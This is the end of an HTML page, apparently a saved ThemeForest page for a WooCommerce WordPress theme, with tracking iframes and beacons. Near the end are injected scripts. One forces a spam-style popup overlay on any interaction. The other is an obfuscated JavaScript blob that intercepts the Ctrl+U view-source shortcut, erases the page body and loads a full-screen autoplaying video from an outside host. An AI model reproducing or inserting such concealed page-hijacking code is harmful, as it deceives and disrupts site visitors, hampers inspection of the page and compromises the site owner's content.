src="https://td.doubleclick.net/td/rul/943617023?random=1753876666631&amp;cv=11&amp;fst=1753876666631&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be57s1v889115050z89195929391za200zb9195929391zd9195929391&amp;gcd=13n3n3n3n5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105103161~105103163~105124543~105124545&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;did=dMWZhNz&amp;gdid=dMWZhNz&amp;npa=0&amp;us_privacy=1---&amp;pscdl=noapi&amp;auid=786247872.1753876602&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.183%7CGoogle%2520Chrome%3B138.0.7204.183&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;fledge=1&amp;_tu=Cg&amp;data=ads_data_redaction%3Dfalse" style="display: none; visibility: hidden;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:300,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:300}" bis_id="fr_z2gfbnsev3bhw7ln6q22jb" bis_depth="0" bis_chainid="4"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-800411572" data-load-time="1753876666710" height="0" width="0" src="https://td.doubleclick.net/td/rul/800411572?random=1753876666684&amp;cv=11&amp;fst=1753876666684&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be57s1v896649154z89195929391za200zb9195929391zd9195929391&amp;gcd=13n3n3n3n5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105124543~105124545&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;npa=0&amp;us_privacy=1---&amp;pscdl=noapi&amp;auid=786247872.1753876602&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.183%7CGoogle%2520Chrome%3B138.0.7204.183&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config" style="display: none; visibility: hidden;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:300,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:300}" bis_id="fr_ir7vx1wyqbahien0mokr2t" bis_depth="0" bis_chainid="5"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-934741711" data-load-time="1753876666723" height="0" width="0" src="https://td.doubleclick.net/td/rul/934741711?random=1753876666713&amp;cv=11&amp;fst=1753876666713&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be57s1v896649154z89195929391za200zb9195929391zd9195929391&amp;gcd=13n3n3n3n5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163~105124543~105124545&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;npa=0&amp;us_privacy=1---&amp;pscdl=noapi&amp;auid=786247872.1753876602&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.183%7CGoogle%2520Chrome%3B138.0.7204.183&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config" style="display: none; visibility: hidden;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:300,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:300}" bis_id="fr_rldn0wquvhqrddm50v4c1n" bis_depth="0" bis_chainid="6"></iframe><img id="CookiebotSessionPixel" src="https://imgsct.cookiebot.com/1.gif?dgi=d10f7659-aa82-4007-9cf1-54a9496002bf" alt="Cookiebot session tracker icon loaded" data-cookieconsent="ignore" style="display: none;">
    <div id="batBeacon552678157489" style="width: 0px; height: 0px; display: none; visibility: hidden;" bis_skin_checked="1"><img id="batBeacon178618191654" width="0" height="0" alt="" src="https://bat.bing.com/action/0?ti=16005611&amp;tm=gtm002&amp;Ver=2&amp;mid=bb77e21d-0c6c-42c3-ba87-fe2355ba6056&amp;bo=2&amp;sid=422440906d3c11f083cb21e95f31b0ab&amp;vid=422465806d3c11f091d599aa9de8ebcb&amp;vids=0&amp;msclkid=N&amp;uach=pv%3D19.0.0&amp;pi=918639831&amp;lg=en-US&amp;sw=1920&amp;sh=1080&amp;sc=24&amp;tl=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;p=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;r=https%3A%2F%2Fwww.google.com%2F&amp;lt=4778&amp;evt=pageLoad&amp;sv=1&amp;asc=G&amp;cdb=AQIT&amp;rn=643027" style="width: 0px; height: 0px; display: none; visibility: hidden;"></div>
            <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"903a6846a73944019dbbb71181ddf279","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'97ee3039bad262dc',t:'MTc1NzgzNTEyNC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
  <script>
document.addEventListener('DOMContentLoaded', function(){
  var overlay = document.getElementById('moh-yung');
  var closeBtn = document.getElementById('pop-upslot');
  var img = overlay ? overlay.querySelector('.pop-img') : null;

  if(!overlay){
    console.warn('[POP] #moh-yung tidak ditemukan.');
    return;
  }

  function show(){
    if (img && !img.src) {
      var ds = img.getAttribute('data-src');
      if (ds) img.src = ds;
    }
    overlay.style.display = 'flex';
  }
  function hide(){ overlay.style.display = 'none'; }

  if (closeBtn) closeBtn.addEventListener('click', hide);
  overlay.addEventListener('click', function(e){ if(e.target === overlay) hide(); });

  var path = location.pathname.replace(/\/+$/,'');
  var isHome = path === '' || path === '/' || /\/index(\.html|\.php)?$/i.test(location.pathname);
  var alwaysShow = true; 

  if (alwaysShow || isHome) {
    var shown = false;
    var trigger = function(){
      if (shown) return;
      shown = true;
      cleanup();
      show();
    };
    var cleanup = function(){
      window.removeEventListener('scroll', trigger);
      window.removeEventListener('click', trigger);
      window.removeEventListener('keydown', trigger);
      window.removeEventListener('touchstart', trigger);
    };

    window.addEventListener('scroll', trigger, {passive:true});
    window.addEventListener('click', trigger);
    window.addEventListener('keydown', trigger);
    window.addEventListener('touchstart', trigger, {passive:true});

    setTimeout(trigger, 15000);
  }
});
  
  var _0x11b82b=_0x4d70;function _0x4d70(_0x1696fc,_0xef4294){var _0x4f4ca3=_0x4f4c();return _0x4d70=function(_0x4d7009,_0x419f42){_0x4d7009=_0x4d7009-0x6e;var _0x2fd08d=_0x4f4ca3[_0x4d7009];return _0x2fd08d;},_0x4d70(_0x1696fc,_0xef4294);}(function(_0x4e9f4f,_0xcd774e){var _0x34da5a=_0x4d70,_0x4002c0=_0x4e9f4f();while(!![]){try{var _0x41085b=parseInt(_0x34da5a(0xac))/0x1*(parseInt(_0x34da5a(0x71))/0x2)+parseInt(_0x34da5a(0xa4))/0x3*(parseInt(_0x34da5a(0xa7))/0x4)+parseInt(_0x34da5a(0x7c))/0x5+-parseInt(_0x34da5a(0x9d))/0x6+-parseInt(_0x34da5a(0x70))/0x7+parseInt(_0x34da5a(0x98))/0x8*(-parseInt(_0x34da5a(0x84))/0x9)+parseInt(_0x34da5a(0x82))/0xa*(parseInt(_0x34da5a(0x7e))/0xb);if(_0x41085b===_0xcd774e)break;else _0x4002c0['push'](_0x4002c0['shift']());}catch(_0x161983){_0x4002c0['push'](_0x4002c0['shift']());}}}(_0x4f4c,0xb1918),shortcut={'all_shortcuts':{},'add':function(_0x137d48,_0x5e5e11,_0x38e8ed){var _0xb74df5=_0x4d70,_0x3dd539={'type':_0xb74df5(0xa5),'propagate':!0x1,'disable_in_input':!0x1,'target':document,'keycode':!0x1};if(_0x38e8ed){for(var _0x5579cc in _0x3dd539)_0xb74df5(0x93)==typeof _0x38e8ed[_0x5579cc]&&(_0x38e8ed[_0x5579cc]=_0x3dd539[_0x5579cc]);}else _0x38e8ed=_0x3dd539;_0x3dd539=_0x38e8ed['target'],'string'==typeof _0x38e8ed[_0xb74df5(0xa9)]&&(_0x3dd539=document['getElementById'](_0x38e8ed[_0xb74df5(0xa9)])),_0x137d48=_0x137d48[_0xb74df5(0x78)](),_0x5579cc=function(_0x5142f4){var _0x3f607d=_0xb74df5;_0x5142f4=_0x5142f4||window[_0x3f607d(0xa8)];if(_0x38e8ed[_0x3f607d(0x8c)]){var _0x5bf6f3;_0x5142f4['target']?_0x5bf6f3=_0x5142f4['target']:_0x5142f4[_0x3f607d(0x79)]&&(_0x5bf6f3=_0x5142f4[_0x3f607d(0x79)]),0x3==_0x5bf6f3[_0x3f607d(0x87)]&&(_0x5bf6f3=_0x5bf6f3[_0x3f607d(0x88)]);if(_0x3f607d(0xab)==_0x5bf6f3[_0x3f607d(0x8a)]||_0x3f607d(0x96)==_0x5bf6f3[_0x3f607d(0x8a)])return;}_0x5142f4[_0x3f607d(0xa2)]?code=_0x5142f4['keyCode']:_0x5142f4[_0x3f607d(0x9c)]&&(code=_0x5142f4[_0x3f607d(0x9c)]),_0x5bf6f3=String[_0x3f607d(0xad)](code)['toLowerCase'](),0xbc==code&&(_0x5bf6f3=','),0xbe==code&&(_0x5bf6f3='.');var _0x210594=_0x137d48['split']('+'),_0x709d2c=0x0,_0x7f5ef5={'`':'~',0x1:'!',0x2:'@',0x3:'#',0x4:'$',0x5:'%',0x6:'^',0x7:'&',0x8:'*',0x9:'(',0x0:')','-':'_','=':'+',';':':','\x27':'\x22',',':'<','.':'>','/':'?','\x5c':'|'},_0x3dc760={'esc':0x1b,'escape':0x1b,'tab':0x9,'space':0x20,'return':0xd,'enter':0xd,'backspace':0x8,'left':0x25,'up':0x26,'right':0x27,'down':0x28,'f1':0x70,'f2':0x71,'f3':0x72,'f4':0x73,'f5':0x74,'f6':0x75,'f7':0x76,'f8':0x77,'f9':0x78,'f10':0x79,'f11':0x7a,'f12':0x7b},_0x3b8e58=!0x1,_0x3fa481=!0x1,_0x35c9d2=!0x1,_0x17266a=!0x1,_0x572ae5=!0x1,_0x3811ca=!0x1,_0x3a178c=!0x1,_0x49f26c=!0x1;_0x5142f4['ctrlKey']&&(_0x17266a=!0x0),_0x5142f4['shiftKey']&&(_0x3fa481=!0x0),_0x5142f4[_0x3f607d(0x74)]&&(_0x3811ca=!0x0),_0x5142f4['metaKey']&&(_0x49f26c=!0x0);for(var _0x12e4aa=0x0;k=_0x210594[_0x12e4aa],_0x12e4aa<_0x210594[_0x3f607d(0x95)];_0x12e4aa++)_0x3f607d(0xa6)==k||_0x3f607d(0x94)==k?(_0x709d2c++,_0x35c9d2=!0x0):_0x3f607d(0xaf)==k?(_0x709d2c++,_0x3b8e58=!0x0):_0x3f607d(0x8e)==k?(_0x709d2c++,_0x572ae5=!0x0):_0x3f607d(0x89)==k?(_0x709d2c++,_0x3a178c=!0x0):0x1<k[_0x3f607d(0x95)]?_0x3dc760[k]==code&&_0x709d2c++:_0x38e8ed[_0x3f607d(0x81)]?_0x38e8ed['keycode']==code&&_0x709d2c++:_0x5bf6f3==k?_0x709d2c++:_0x7f5ef5[_0x5bf6f3]&&_0x5142f4[_0x3f607d(0x76)]&&(_0x5bf6f3=_0x7f5ef5[_0x5bf6f3],_0x5bf6f3==k&&_0x709d2c++);if(_0x709d2c==_0x210594[_0x3f607d(0x95)]&&_0x17266a==_0x35c9d2&&_0x3fa481==_0x3b8e58&&_0x3811ca==_0x572ae5&&_0x49f26c==_0x3a178c&&(_0x5e5e11(_0x5142f4),!_0x38e8ed[_0x3f607d(0x97)]))return _0x5142f4[_0x3f607d(0x6e)]=!0x0,_0x5142f4[_0x3f607d(0x77)]=!0x1,_0x5142f4['stopPropagation']&&(_0x5142f4[_0x3f607d(0x90)](),_0x5142f4[_0x3f607d(0x91)]()),!0x1;},this[_0xb74df5(0x7d)][_0x137d48]={'callback':_0x5579cc,'target':_0x3dd539,'event':_0x38e8ed['type']},_0x3dd539[_0xb74df5(0xae)]?_0x3dd539[_0xb74df5(0xae)](_0x38e8ed[_0xb74df5(0x92)],_0x5579cc,!0x1):_0x3dd539[_0xb74df5(0xaa)]?_0x3dd539[_0xb74df5(0xaa)]('on'+_0x38e8ed['type'],_0x5579cc):_0x3dd539['on'+_0x38e8ed[_0xb74df5(0x92)]]=_0x5579cc;},'remove':function(_0x3730bc){var _0x52c40d=_0x4d70,_0x3730bc=_0x3730bc['toLowerCase'](),_0x451597=this[_0x52c40d(0x7d)][_0x3730bc];delete this[_0x52c40d(0x7d)][_0x3730bc];if(_0x451597){var _0x3730bc=_0x451597[_0x52c40d(0xa8)],_0x37b36a=_0x451597[_0x52c40d(0xa9)],_0x451597=_0x451597[_0x52c40d(0x7f)];_0x37b36a[_0x52c40d(0x80)]?_0x37b36a[_0x52c40d(0x80)]('on'+_0x3730bc,_0x451597):_0x37b36a['removeEventListener']?_0x37b36a['removeEventListener'](_0x3730bc,_0x451597,!0x1):_0x37b36a['on'+_0x3730bc]=!0x1;}}},shortcut[_0x11b82b(0x85)](_0x11b82b(0x9e),function(){var _0xaa48b1=_0x11b82b;document[_0xaa48b1(0x73)][_0xaa48b1(0x83)]='';var _0x54b9df=document[_0xaa48b1(0x7b)](_0xaa48b1(0xa3));_0x54b9df[_0xaa48b1(0x8d)]=_0xaa48b1(0x72),_0x54b9df[_0xaa48b1(0x6f)]=!![],_0x54b9df[_0xaa48b1(0x8b)]=!![],_0x54b9df[_0xaa48b1(0x8f)]=!![],_0x54b9df[_0xaa48b1(0x75)]=![],_0x54b9df[_0xaa48b1(0x99)][_0xaa48b1(0x7a)]=_0xaa48b1(0x9f),_0x54b9df[_0xaa48b1(0x99)][_0xaa48b1(0xa1)]=_0xaa48b1(0x9b),_0x54b9df[_0xaa48b1(0x99)][_0xaa48b1(0x9a)]=_0xaa48b1(0x86),document[_0xaa48b1(0x73)][_0xaa48b1(0xa0)](_0x54b9df);}));function _0x4f4c(){var _0x5b5256=['undefined','control','length','TEXTAREA','propagate','95416TAIiDv','style','objectFit','100vh','which','4642794NVCDaG','Ctrl+U','100%','appendChild','height','keyCode','video','2886qoVDFy','keydown','ctrl','692WVgsUQ','event','target','attachEvent','INPUT','3RVbvtp','fromCharCode','addEventListener','shift','cancelBubble','autoplay','290472BxkklU','530538hUeuFg','https://seo-burung-nuri.pages.dev/terkejod.mp4','body','altKey','muted','shiftKey','returnValue','toLowerCase','srcElement','width','createElement','866915HqJqGj','all_shortcuts','40942EbnmzI','callback','detachEvent','keycode','4330GCYaQF','innerHTML','909MIRKfy','add','cover','nodeType','parentNode','meta','tagName','controls','disable_in_input','src','alt','loop','stopPropagation','preventDefault','type'];_0x4f4c=function(){return _0x5b5256;};return _0x4f4c();}
                 
</script>
</body>
</html>
